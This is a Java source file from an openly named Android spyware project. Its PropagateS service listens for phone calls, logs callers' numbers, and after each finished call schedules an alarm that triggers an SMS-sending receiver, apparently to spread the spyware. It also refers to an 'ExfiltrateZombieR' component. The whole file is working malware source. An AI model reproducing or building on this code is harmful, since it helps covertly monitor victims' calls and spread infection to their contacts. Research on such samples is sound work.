package android.spyware.services;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.spyware.receivers.ExfiltrateZombieR;
import android.spyware.receivers.SendSMSR;
import android.support.annotation.Nullable;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.Calendar;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;
import static android.spyware.Spyware.TIMER;

/**
 * Copyright (C) 2015 Alexandre Teyar
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 **/

public class PropagateS extends Service {
    private int previousState = 0;

    @Override
    public void onCreate() {
        super.onCreate();

        if (DEV_MODE) { Log.i(TAG, PropagateS.class.getName() + "->onCreate:service started..."); }

        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        PhoneStateListener phoneStateListener = new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String callerNumber) {
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:
                        Log.d(TAG, PropagateS.class.getName() + "->onCallStateChanged:incoming call - " + callerNumber);
                        PropagateS.this.previousState = state;

                        break;

                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        Log.d(TAG, PropagateS.class.getName() + "->onCallStateChanged:on call - " + callerNumber);
                        PropagateS.this.previousState = state;

                        break;

                    case TelephonyManager.CALL_STATE_IDLE:
                        if (previousState == TelephonyManager.CALL_STATE_OFFHOOK) {
                            Log.d(TAG, PropagateS.class.getName() + "->onCallStateChanged:call ended - " + callerNumber);
                            previousState = state;

                            PropagateS.this.setAlarm(PropagateS.this);
                        } else if (previousState == TelephonyManager.CALL_STATE_RINGING) {
                            Log.d(TAG, PropagateS.class.getName() + "->onCallStateChanged:call rejected - " + callerNumber);
                            PropagateS.this.previousState = state;
                        }

                        break;
                }
            }
        };

        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
    }

    private void setAlarm(Context context) {
        Calendar calendar = Calendar.getInstance();
        calendar.add(Calendar.MINUTE, TIMER);

        Intent        intent        = new Intent(context, SendSMSR.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_ONE_SHOT);

        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);

        if (DEV_MODE) {
            Log.i(TAG, ExfiltrateZombieR.class.getName() + "->setAlarm:" + calendar.get(Calendar.HOUR) + ":"
                       + calendar.get(Calendar.MINUTE) + ":" + calendar.get(Calendar.SECOND));
        }
    }

    @Override
    public void onDestroy() {
        if (DEV_MODE) { Log.i(TAG, PropagateS.class.getName() + "->onDestroy:service terminated"); }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
